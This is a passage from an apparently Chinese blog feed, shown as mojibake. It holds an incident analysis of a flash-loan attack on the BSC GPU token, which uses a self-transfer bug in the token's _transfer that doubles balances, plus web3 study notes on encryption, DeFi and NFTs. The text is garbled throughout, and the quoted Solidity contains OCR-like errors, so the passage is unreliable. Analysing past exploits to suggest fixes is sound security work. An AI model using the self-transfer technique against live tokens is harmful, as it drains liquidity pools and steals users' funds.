äº†100äº¿å€ï¼Œè¾¾åˆ°28,070,259,409,924æšä»£å¸ã€‚æœ€åï¼Œé»‘å®¢å°†GPUä»£å¸å–å‡ºæ¢æˆBUSDï¼Œç”¨äºå¿è¿˜é—ªè´·æœ¬æ¯ï¼Œæœ€ç»ˆçªƒå–çº¦3.2ä¸‡ç¾å…ƒèµ„é‡‘ã€‚</p><p>é¦–å…ˆæ”»å‡»è€…ä»DODOå€Ÿè´·åè®®ä¸­å‘èµ·é—ªç”µè´·ï¼Œå€Ÿå‡ºBUSDåˆ°æ”»å‡»åˆçº¦åœ°å€ï¼Œæ”»å‡»è€…åˆçº¦åœ¨è°ƒç”¨PancakeSwapåè®®ï¼Œå°†å€Ÿå‡ºçš„BUSDå…‘æ¢æˆGPUä»£å¸ï¼Œåˆ©ç”¨è‡ªæˆ‘è½¬è´¦æ¼æ´ï¼Œå‡­ç©ºäº§ç”ŸCPUä»£å¸ï¼Œæ”»å‡»è€…åˆçº¦è‡ªå·±ç»™è‡ªå·±è½¬è´¦ï¼Œæ¯è½¬è´¦ä¸€æ¬¡ï¼ŒGPUèµ„äº§å°±ä¼šç¿»å€ï¼Œæ”»å‡»è€…åˆçº¦å°†è·å–åˆ°çš„GPUä»£å¸å‘é€åˆ°PancakeSwap V2åè®®ä¸­ï¼Œæ¢å–BUSDã€‚ç„¶åæ”»å‡»è€…ä»PancakeSwap V2åè®®ä¸­è·å–çš„BUSDï¼Œå°†å…¶ä¸­çš„ä¸€éƒ¨åˆ†ç”¨äºè¿”è¿˜DODOå€Ÿè´·åè®®çš„æœ¬é‡‘å’Œåˆ©æ¯ï¼Œå‰©ä¸‹çš„éƒ½æ˜¯æ”»å‡»è€…æ‰€è·å¾—çš„ã€‚</p><p>å®Œæ•´çš„è°ƒç”¨ä¿¡æ¯çœ‹<a href="https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb?line=6">è¿™é‡Œ</a></p><p>ä¸‹é¢æ˜¯DODOåè®®ä¸­å€Ÿè´·åè®®ä¸­çš„å€Ÿè´·å‡½æ•°<strong>flashLoan</strong>çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œç”¨äºä»DODOåè®®èµ„é‡‘æ± ä¸­å€Ÿè´·æŒ‡å®šæ•°é‡çš„èµ„äº§ï¼Œè¿™é‡Œçš„å‚æ•°baseAmountä¸ºé›¶ï¼Œè€ŒquoteAmountä¸º226007ï¼Œè¡¨ç¤ºå€Ÿè´·è¿™ä¹ˆå¤šä¸ªBUSDï¼ŒassetToä¸ºæ”»å‡»è€…åˆçº¦åœ°å€ï¼Œdataåˆ™åœ¨å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨åˆ°<br>ç®€å•çš„è®²è¯¥å‡½æ•°åˆ†ä¸º3ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªéƒ¨åˆ†è®²èµ„äº§å‘é€åˆ°ç›®æ ‡åœ°å€ï¼Œç¬¬äºŒéƒ¨åˆ†æ‰§è¡Œç›®æ ‡åœ°å€çš„å›è°ƒå‡½æ•°ï¼Œé€šå¸¸ç”¨äºå®ç°å¥—åˆ©é€»è¾‘ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ ¡éªŒæ˜¯å¦å½’è¿˜æœ¬åˆ©æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external preventReentrant &#123;</span><br><span class="line">    // step1 transfer token to target address</span><br><span class="line">        _transferBaseOut(assetTo, baseAmount);</span><br><span class="line">        _transferQuoteOut(assetTo, quoteAmount);</span><br><span class="line"></span><br><span class="line">// step2 callback function</span><br><span class="line">        if (data.length &gt; 0)</span><br><span class="line">            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);</span><br><span class="line"></span><br><span class="line">        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));</span><br><span class="line">        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // step3 check balance</span><br><span class="line">        require(</span><br><span class="line">            baseBalance &gt;= _BASE_RESERVE_ || quoteBalance &gt;= _QUOTE_RESERVE_,</span><br><span class="line">            &quot;FLASH_LOAN_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // ...;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>PancakeRouter</strong>åˆçº¦ï¼Œè¯¥åˆçº¦ä¸»è¦ç”¨äºBUSDå’ŒGPUä»£å¸çš„å…‘æ¢ï¼Œç”±äºGPUåˆçº¦ä¼šåœ¨å…‘æ¢ç¯èŠ‚ä¸­æ”¶å–æ‰‹ç»­è´¹ï¼Œå…‘æ¢çš„å¦ä¸€ä¸ªä»£å¸æ•°é‡å¯èƒ½æ— æ³•æå‰å‡†ç¡®è®¡ç®—ï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨äº†ä¸‹é¢çš„<strong>swapExactTokenForTokensSupportingFeeOnTransferTokendså‡½æ•°</strong>ï¼Œå‚æ•°<strong>amountln</strong>è¡¨ç¤ºå¾€æ± å­é‡Œå­˜å…¥çš„ä»£å¸æ•°é‡ï¼Œè€Œå‚æ•°<strong>amountOutMin</strong>è¡¨ç¤ºä»æ± å­é‡Œå–å‡ºæ¥å¦ä¸€ç§ä»£å¸çš„æœ€å°æ•°é‡ï¼Œ<strong>path</strong>ä»£è¡¨ä»£å¸çš„å…‘æ¢è·¯å¾„ï¼Œå¦‚ <strong>[address(A),address(B)]<strong>è¡¨ç¤ºAä»£å¸å…‘æ¢æˆBä»£å¸ï¼Œå‚æ•°</strong>to</strong> è¡¨ç¤ºå…‘æ¢å‡ºæ¥çš„ä»£å¸è½¬å…¥ç›®æ ‡åœ°å€ï¼Œ<strong>deadline</strong>ä¸ºå…‘æ¢æœ‰æ•ˆæ—¥æœŸ<br>è¯¥å‡½æ•°ç®€å•åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æŠŠAä»£å¸è½¬å…¥ç›¸åº”çš„æ± å­ä¸­ï¼Œç¬¬äºŒéƒ¨åˆ†é€šè¿‡**_swapSupportingFeeONTransferTokenså‡½æ•°<strong>è®¡ç®—Bä»£å¸çš„æ•°é‡å¹¶è½¬ç»™</strong>to<strong>åœ°å€ï¼Œç¬¬ä¸‰éƒ¨åˆ†åˆ¤æ–­å¾—åˆ°çš„Bä»£å¸æ•°é‡æ˜¯å¦æ»¡è¶³</strong>zamountOutMin**çš„è¦æ±‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) &#123;</span><br><span class="line">// step1 transfer A token to pool</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">    );</span><br><span class="line">    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">    </span><br><span class="line">    // step2 calculate and transfer B token</span><br><span class="line">    _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">    </span><br><span class="line">    // step3 check B token amount</span><br><span class="line">    require(</span><br><span class="line">        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">        &#x27;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPUæ˜¯ä¸€ä¸ªæ™®é€šçš„ERC20ä»£å¸ï¼Œä»–çš„è½¬è´¦å‡½æ•°å¦‚ä¸‹ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰è¿›è¡Œ<strong>from</strong> å’Œ<strong>to</strong>çš„æ˜¯å¦ç›¸ç­‰çš„åˆ¤æ–­ï¼Œå®é™…çš„è½¬è´¦é€»è¾‘æ­£å‘ç”Ÿåœ¨çˆ¶åˆçº¦ä¸­ï¼Œæ­£æ˜¯å¦‚æ­¤ï¼Œè¿™ä¸ªæ¼æ´å¾ˆå°‘è¢«å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">  address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">   require(from != address(0)ï¼Œ&quot;ERC20: transfer from the zero address&quot;); require(to != address(0)ï¼Œ&quot;ERC20: transfer to the zero address&quot;); require(amount&gt;0);</span><br><span class="line">   &#125;</span><br><span class="line">   if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[tol])&#123;</span><br><span class="line">    super._transfer(from, to, amount);You, 2 days ago &quot; add demo</span><br><span class="line">      return;</span><br><span class="line">       if(super.balance0f(address(this)) &gt;super.balance0f(uniswapV2Pair).div(2000))&#123;</span><br><span class="line">           if (_isExcludedFromFees[from] || _isExcludedFromFees[tol]) &#123;&#125; else &#123;</span><br><span class="line">                if(_isPairs[from])&#123;</span><br><span class="line">                      require(startTime &lt; block.timestamp,&quot;startTime&quot;);</span><br><span class="line">                     if(startTime.add(18 * 30 *86400) &gt; block. timestamp)&#123;</span><br><span class="line">                     super._transfer(from, _destroyAddress, amount.div(100).mul (2)); super._transfer(from, address(this)ï¼Œamount.div(100).mul(1)); amount = amount.div(100).mul(97);</span><br><span class="line">                     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œçˆ¶åˆçº¦çš„_<strong>tranfer</strong>å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ<strong>from</strong> å’Œ<strong>to</strong> æ˜¯å¦ç›¸ç­‰çš„æ£€æŸ¥ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender,address recipient,uint256 amount )internal virtual &#123;</span><br><span class="line"></span><br><span class="line">       (requirelsender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      (require(recipient != address(0),&quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">          uint256 senderAmount = _balances [sender];</span><br><span class="line"></span><br><span class="line">          uint256 recipientAmount = _balances [recipient];</span><br><span class="line"></span><br><span class="line">          (requirelsenderAmount &gt;= amount,&quot;ERC20:transfer amount exceeds balance&quot;);</span><br><span class="line">  </span><br><span class="line">          _balances [sender]= senderAmount. sub(amount);</span><br><span class="line"></span><br><span class="line">          _balances[recipient] = recipientAmount.add(amount);</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»¥ä¸Šä»£ç æˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œï¼Œåœ¨è¿›è¡Œ transfer æ—¶ï¼Œå…ˆä¿å­˜ from å’Œ to çš„ balance åˆ°å˜é‡ senderAmount å’Œ recipientAmountï¼Œéšåè®¡ç®—è½¬è´¦åçš„ senderAmount å’Œ recipientAmount çš„å€¼ï¼Œæœ€ååœ¨æ›´æ–°åˆ° balances ä¸­ã€‚ä½†æ˜¯ï¼Œå½“ from å’Œ to ä¸ºåŒä¸€åœ°å€æ—¶ï¼Œå…ˆæ›´æ–° from å†æ›´æ–° to å…¶å®å°±æ˜¯ç»™ to å‡­ç©ºæ·»åŠ äº† amount æ•°é‡çš„ tokenã€‚æ‰€ä»¥ï¼Œæ”»å‡»è€…é€šè¿‡æŒç»­ç»™è‡ªå·±è½¬è´¦ä»è€Œè®©è‡ªå·±çš„GPU Tokenå‡­ç©ºå¢å¤šã€‚</p><p>è¿™ä¸ªæ”»å‡»æˆåŠŸå°±æ˜¯åˆ©ç”¨äº†è‡ªæˆ‘è½¬è´¦çš„æ¼æ´ï¼Œæˆ‘è®¤ä¸ºè¦é˜²å¾¡çš„è¯åŠ ä¸ªå¯¹è½¬è´¦åœ°å€å’Œè¢«è½¬è´¦åœ°å€æ˜¯å¦ç›¸ç­‰çš„æ¡ä»¶</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web3å­¦ä¹ çŸ¥è¯†</title>
      <link href="/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åˆå‘ç°ä¸€ä¸ªå­¦ä¹ ç½‘ç«™ï¼Œæ­£å¥½è¶ç€å›½åº†å‡æœŸï¼Œå†æŠŠçŸ¥è¯†åˆå·©å›ºä¸€éï¼Œå°±å†™äº†è¿™ç¯‡å­¦ä¹ å­¦ä¹ ç¬”è®°è®°å½•ä¸€ä¸‹</p><h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>ä»¥å‰æˆ‘ä»¬çš„ä¿¡æ¯éƒ½é›†ä¸­åœ¨ä¸€ä¸ªè½¯ä»¶ä¸Šï¼Œè¿™é€ æˆäº†ï¼Œæˆ‘ä»¬çš„ä¿¡æ¯å°±ä¼šè¢«æ³„éœ²ï¼Œå°±æ¯”å¦‚2018å¹´Facebook-å‰‘æ¡¥åˆ†æå…¬å¸æ•°æ®æ³„éœ²ä¸‘é—»ï¼Œæ•°ç™¾ä¸‡Facebookç”¨æˆ·çš„ä¸ªäººä¿¡æ¯è¢«ä¸å½“æ”¶é›†å¹¶ç”¨äºå½±å“æ”¿æ²»é€‰ä¸¾ï¼Œè¿™å°±æ˜¯æ•°æ®é›†ä¸­æ§åˆ¶çš„é£é™©å’Œåæœ</p><p>é‚£ä¹ˆweb3å°±å‡ºç°äº†ï¼Œå®ƒæ˜¯å»ºç«‹åœ¨åŒºå—é“¾æŠ€æœ¯ä¸Šçš„ä¸‹ä¸€ä»£äº’è”ç½‘ï¼Œå®ƒå¼ºè°ƒ<strong>æƒåŠ›ä¸‹æ”¾</strong>ï¼Œè¿™å°±æ„å‘³ç€æ²¡æœ‰é›†ä¸­çš„æƒå¨æœºæ„æ¥ç®¡ç†æ•°æ®å’Œèµ„æº</p><p>åœ¨web3çš„ä¸–ç•Œé‡Œï¼Œç”¨æˆ·æ‹¥æœ‰è‡ªå·±åˆ›ç«‹çš„å†…å®¹å’Œæ•°æ®ï¼Œæ‘†è„±äº†å¯¹ä¼ ç»Ÿä¸­å¿ƒåŒ–å¹³å°çš„ä¾èµ–ï¼Œç”±æ­¤web3ä¹Ÿä¿ƒè¿›äº†æ–°çš„å•†ä¸šæ¨¡å¼ï¼Œä¾‹å¦‚ï¼š<strong>å»ä¸­æ€§åŒ–é‡‘èï¼ˆDeFiï¼‰</strong>   <strong>éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰</strong>  <strong>å»ä¸­æ€§åŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰</strong></p><p>å®ƒçš„å‘å±•æ¥çœ‹ï¼šä»Web1.0æ—¶ä»£çš„é™æ€ç½‘é¡µï¼Œåˆ°Web2.0çš„ç¤¾äº¤äº’åŠ¨ï¼Œå†åˆ°Web3.0çš„å»ä¸­å¿ƒåŒ–æ™ºèƒ½ç½‘ç»œ</p><p>Web3 å„èµ›é“ç™¾èŠ±é½æ”¾ï¼Œå…±åŒæ„å»ºä¸€ä¸ªå»ä¸­å¿ƒåŒ–ã€é€æ˜åŒ–ã€åˆ›æ–°åŒ–çš„æ•°å­—ç”Ÿæ€ã€‚å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDeFiï¼‰æ¶ˆé™¤äº†ä¸­ä»‹æœºæ„ï¼Œå®ç°äº†å¼€æ”¾å¼çš„é‡‘èäº¤æ˜“å’ŒæœåŠ¡ï¼›éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰èµ‹äºˆäº†æ•°å­—èµ„äº§å”¯ä¸€æ€§å’Œä»·å€¼ï¼›å»ä¸­å¿ƒåŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰ä¿ƒè¿›äº†é›†ä½“å†³ç­–å’Œå…¬å¹³ç®¡ç†ï¼›å»ä¸­å¿ƒåŒ–èº«ä»½ï¼ˆDIDï¼‰ä¿éšœäº†ä¸ªäººèº«ä»½æ•°æ®çš„å®‰å…¨å’Œéšç§ï¼›ç¤¾äº¤é‡‘èï¼ˆSocialFiï¼‰å’Œæ¸¸æˆé‡‘èï¼ˆGameFiï¼‰å°†ä¼ ç»Ÿçš„ç¤¾äº¤ã€æ¸¸æˆæ´»åŠ¨ä¸ç»æµæ¿€åŠ±ç›¸ç»“åˆï¼Œé‡æ–°å®šä¹‰äº†ç”¨æˆ·å‚ä¸çš„ä»·å€¼ï¼›åŸºç¡€è®¾æ–½èµ›é“ä¸ºæ‰€æœ‰è¿™äº›åˆ›æ–°æä¾›äº†ç¨³å®šçš„æŠ€æœ¯æ”¯æŒå’Œå‘å±•å¹³å°ã€‚</p><h2 id="web3é¢†åŸŸçš„çŸ¥è¯†"><a href="#web3é¢†åŸŸçš„çŸ¥è¯†" class="headerlink" title="web3é¢†åŸŸçš„çŸ¥è¯†"></a>web3é¢†åŸŸçš„çŸ¥è¯†</h2><h3 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h3><p>åŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒæ ·çš„å¯†é’¥ï¼Œè¿™æ ·å°±å¿…é¡»åŒæ–¹çŸ¥é“å¯†é’¥ï¼Œå¹¶ä¸”éƒ½ä¿è¯ä¸å‘å¤–ä¼ ï¼Œä½†æ˜¯è¿™æ ·çš„ä¿å¯†æ€§ä¸é«˜ï¼Œåªè¦æœ‰äººå¾—åˆ°äº†å¯†é’¥ï¼Œå°±èƒ½è§£å¯†</p><h3 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h3><p>å°±æ˜¯ä¸€ä¸ªäººï¼Œæœ‰ä¿©ä¸ªå¯†é’¥ï¼Œä¸€ä¸ªå…¬é’¥ï¼Œä¸€ä¸ªç§é’¥ï¼Œä¸‹é¢å°†è¯¦ç»†è§£é‡Š</p><h3 id="å…¬é’¥å’Œç§é’¥"><a href="#å…¬é’¥å’Œç§é’¥" class="headerlink" title="å…¬é’¥å’Œç§é’¥"></a>å…¬é’¥å’Œç§é’¥</h3><p>ç§é’¥ï¼šç§é’¥æ˜¯éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”±ä¸€ç³»åˆ—å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œæ˜¯ç”¨æˆ·èº«ä»½å’Œèµ„äº§ç®¡ç†çš„æ ¸å¿ƒï¼Œå¿…é¡»ä¸¥æ ¼ä¿å¯†ã€‚<br>å…¬é’¥:å…¬é’¥ç”±ç§é’¥ç”Ÿæˆï¼Œæ˜¯ç§é’¥çš„é…å¯¹å¯†é’¥ï¼Œå¯ä»¥å…¬å¼€å…±äº«ï¼Œç”¨äºéªŒè¯ä¿¡æ¯å’ŒåŠ å¯†ç§é’¥ç­¾åçš„æ•°æ®ã€‚<br>ä»¥å‰æ²¡æœ‰åˆ†æ¸…æ¥šå…¬é’¥å’Œç§é’¥çš„ä½œç”¨ï¼Œç°åœ¨æˆ‘æ˜ç™½äº†ï¼Œå°±ä¸¾ä¸ªä¾‹å­å§<br>Aå‘Bå‘é€ä¸€ä¸ªäº¤æ˜“ï¼Œé¦–å…ˆAè·å¾—Bçš„å…¬é’¥ï¼Œç”¨æ¥å¯¹äº¤æ˜“åŠ å¯†ï¼ŒBæ”¶åˆ°äº¤æ˜“åç”¨ä»–è‡ªå·±çš„ç§é’¥è¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯å…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œè°éƒ½å¯ä»¥ç”¨Bçš„å…¬é’¥åŠ å¯†äº¤æ˜“ï¼Œå†’å……Aç»™Bå‘ï¼Œæ‰€ä»¥å°±æœ‰æ•°å­—ç­¾åå‡ºç°äº†ï¼ŒAåœ¨å‘é€æ¶ˆæ¯å‰ç”¨è‡ªå·±çš„ç§é’¥å…ˆå¯¹äº¤æ˜“ç­¾åï¼Œç”Ÿæˆv,r,s,Bæ¥å—åˆ°æ¶ˆæ¯åå°±å¯ä»¥ä½¿ç”¨Açš„å…¬é’¥è¿›è¡Œè§£å¯†ï¼Œè¿™ä½¿ç”¨äº†éå¯¹ç§°åŠ å¯†å’Œæ•°å­—ç­¾åçš„æŠ€æœ¯</p><h3 id="defi"><a href="#defi" class="headerlink" title="defi"></a>defi</h3><p>å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆç®€ç§° DeFiï¼‰æ˜¯ä¸€ç§åŸºäºåŒºå—é“¾æŠ€æœ¯çš„é‡‘èç”Ÿæ€ç³»ç»Ÿã€‚å®ƒåˆ©ç”¨æ™ºèƒ½åˆçº¦ï¼ˆå¯è‡ªåŠ¨æ‰§è¡Œçš„ç¨‹åºä»£ç ï¼‰å®ç°é‡‘èæœåŠ¡è‡ªåŠ¨åŒ–ï¼ŒåŒæ—¶æ¶ˆé™¤ä¼ ç»Ÿé‡‘èç³»ç»Ÿä¸­çš„é“¶è¡Œå’Œç»çºªäººç­‰ä¸­ä»‹æœºæ„ã€‚åœ¨ DeFi çš„ä¸–ç•Œé‡Œï¼Œæ‰€æœ‰äº¤æ˜“å’ŒæœåŠ¡éƒ½æ˜¯é€æ˜çš„ã€æ— éœ€è®¸å¯çš„ï¼Œå¹¶ä¸”å¯¹ä»»ä½•æœ‰äº’è”ç½‘è®¿é—®æƒé™çš„äººå¼€æ”¾</p><p>ä¸ä¼ ç»Ÿçš„ä¸­å¿ƒåŒ–é‡‘èï¼ˆCeFiï¼‰ç›¸æ¯”ï¼Œå»ä¸­å¿ƒåŒ–é‡‘èåœ¨å¯åŠæ€§ã€é€æ˜åº¦ã€å®‰å…¨æ€§ã€æ•ˆç‡ã€åˆ›æ–°æ€§å’Œå»ä¸­å¿ƒåŒ–æ–¹é¢å…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ã€‚</p><ul><li>é¦–å…ˆï¼ŒDeFi æä¾›æ— è¾¹ç•Œé‡‘èæœåŠ¡ï¼Œç¡®ä¿å…¨çƒç”¨æˆ·åªè¦æœ‰äº’è”ç½‘è¿æ¥å°±å¯ä»¥ä¸å—åœ°åŸŸé™åˆ¶åœ°è¿›è¡Œäº¤æ˜“ã€‚è¿™å¯¹äºä¼ ç»Ÿé“¶è¡ŒæœåŠ¡ä¸è¶³æˆ–æ— æ³•ä½¿ç”¨çš„åœ°åŒºå°¤ä¸ºé‡è¦ã€‚</li><li>å…¶æ¬¡ï¼ŒDeFi åˆ©ç”¨åŒºå—é“¾æŠ€æœ¯å…¬å¼€è®°å½•æ‰€æœ‰äº¤æ˜“ï¼Œä»»ä½•äººéƒ½å¯ä»¥éªŒè¯å’Œå®¡è®¡è¿™äº›è®°å½•ã€‚è¿™ç§å¼€æ”¾æ€§å¤§å¤§æé«˜äº†ç³»ç»Ÿçš„é€æ˜åº¦å’Œå¯ä¿¡åº¦ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ¸…æ¥šåœ°çœ‹åˆ°èµ„é‡‘çš„æµå‘ï¼Œä»è€Œå‡å°‘äº†éšè—çš„è´¹ç”¨å’Œæ½œåœ¨çš„ä¸å½“è¡Œä¸ºã€‚</li><li>åœ¨å®‰å…¨æ€§æ–¹é¢ï¼ŒDeFi é€šè¿‡å…ˆè¿›çš„åŠ å¯†æŠ€æœ¯ä¿æŠ¤ç”¨æˆ·çš„èµ„é‡‘å’Œäº¤æ˜“ï¼Œå¤§å¤§é™ä½äº†æ¬ºè¯ˆå’Œé»‘å®¢æ”»å‡»çš„é£é™©ã€‚è‡ªåŠ¨åŒ–æ™ºèƒ½åˆçº¦è¿˜å¯ä»¥ç¡®ä¿æ— ç¼æ‰§è¡Œäº¤æ˜“ï¼Œè€Œæ— éœ€ä¼ ç»Ÿé‡‘èæœºæ„å…¸å‹çš„å¤æ‚ç¨‹åºå’Œäººå·¥å®¡æ ¸ï¼Œä»è€Œæé«˜è¿è¥æ•ˆç‡ã€‚</li><li>åœ¨åˆ›æ–°æ–¹é¢ï¼ŒDeFi çš„å¼€æ”¾å¼€å‘å¹³å°å¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„å¼€å‘è€…ï¼Œæ¨åŠ¨äº†æ–°çš„é‡‘èäº§å“å’ŒæœåŠ¡ä¸æ–­æ¶Œç°ã€‚è¿™ç§ä»¥ç¤¾åŒºä¸ºä¸»å¯¼çš„å¼€å‘æ¨¡å¼é¼“åŠ±æ€æƒ³äº¤æµå’Œå¿«é€Ÿè¿­ä»£ï¼ŒåŠ é€Ÿäº†é‡‘èé¢†åŸŸçš„æŠ€æœ¯è¿›æ­¥ã€‚</li><li>æœ€åï¼Œä¸å¯èƒ½é¢ä¸´å®•æœºé£é™©çš„ä¼ ç»Ÿé‡‘èæœºæ„ä¸åŒï¼ŒDeFi çš„åˆ†å¸ƒå¼ç»“æ„æœ¬è´¨ä¸Šæ¶ˆé™¤äº†å•ç‚¹æ§åˆ¶ï¼Œå¢å¼ºäº†ç³»ç»Ÿå¯¹æ•…éšœå’Œæ”»å‡»çš„æŠµå¾¡èƒ½åŠ›ã€‚å³ä½¿æŸäº›èŠ‚ç‚¹å—åˆ°æ”»å‡»ï¼Œç½‘ç»œä»å¯æŒç»­è¿è¡Œï¼Œç¡®ä¿é‡‘èæœåŠ¡çš„è¿ç»­æ€§å’Œç¨³å®šæ€§ã€‚<br>ä¸€äº›ç»å…¸çš„defié¡¹ç›®ï¼Œæˆ‘ä¹‹å‰æœ‰å†™è¿‡ç¬”è®°ï¼Œå¯ä»¥å»äº†è§£ä¸€ä¸‹</li></ul><h3 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h3><p>åœ¨æ·±å…¥ç ”ç©¶éåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£â€œå¯åŒè´¨åŒ–â€å’Œâ€œä¸å¯åŒè´¨åŒ–â€çš„æ¦‚å¿µã€‚åœ¨åŠ å¯†è´§å¸çš„ä¸–ç•Œé‡Œï¼Œå¯äº’æ¢æ€§æ„å‘³ç€å¯äº’æ¢æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ 1 ä¸ª BTCï¼Œæˆ‘ä¹Ÿæœ‰ 1 ä¸ª BTCï¼Œå³ä½¿è¿™ä¸¤ä¸ª BTC å¯èƒ½ä½äºä¸åŒçš„é’±åŒ…åœ°å€ï¼Œä½†å®ƒä»¬å…·æœ‰ç›¸åŒçš„ä»·å€¼ï¼Œå¯ä»¥ç›´æ¥äº¤æ¢ã€‚è¿™å°±åƒç”¨ä¸€å¼  100 ç¾å…ƒçš„é’ç¥¨æ¢å¦ä¸€å¼ ç›¸åŒé¢å€¼çš„é’ç¥¨ä¸€æ ·ã€‚å¦ä¸€æ–¹é¢ï¼ŒéåŒè´¨åŒ–æ„å‘³ç€ç‹¬ç‰¹æ€§å’Œä¸å¯æ›¿ä»£æ€§ã€‚éåŒè´¨åŒ–ä»£å¸ (NFT) å°±æ˜¯è¿™æ ·ç‹¬ç‰¹ä¸”ä¸å¯äº’æ¢çš„æ•°å­—èµ„äº§ã€‚NFT é€šå¸¸ç”¨äºè¯æ˜æ•°å­—è‰ºæœ¯å“ã€æ”¶è—å“ç­‰èµ„äº§çš„æ‰€æœ‰æƒã€‚</p><p>ä¸åŒè´¨åŒ–ä»£å¸ç›¸æ¯”ï¼ŒéåŒè´¨åŒ–ä»£å¸ï¼ˆNFTï¼‰åœ¨æ‰€æœ‰æƒéªŒè¯ã€å”¯ä¸€æ€§ã€æ”¶è—ä»·å€¼ã€å¸‚åœºæµåŠ¨æ€§å’Œå‚ä¸åº¦ç­‰æ–¹é¢å…·æœ‰ç‹¬ç‰¹çš„ä»·å€¼ï¼š</p><ul><li>é¦–å…ˆï¼Œä½œä¸ºåŒºå—é“¾æŠ€æœ¯çš„äº§ç‰©ï¼ŒNFT ä¸ºæ•°å­—èµ„äº§æä¾›äº†ä¸å¯ç¯¡æ”¹çš„æ‰€æœ‰æƒè¯æ˜ã€‚è¿™æ„å‘³ç€è‰ºæœ¯å®¶å’Œå†…å®¹åˆ›ä½œè€…å¯ä»¥ç¡®ä¿ä»–ä»¬çš„åŸåˆ›ä½œå“å¾—åˆ°åˆæ³•è®¤è¯å’Œè¿½è¸ªï¼Œä»è€Œä¿æŠ¤ä»–ä»¬çš„çŸ¥è¯†äº§æƒã€‚</li><li>å…¶æ¬¡ï¼Œç”±äºæ¯ä¸ª NFT 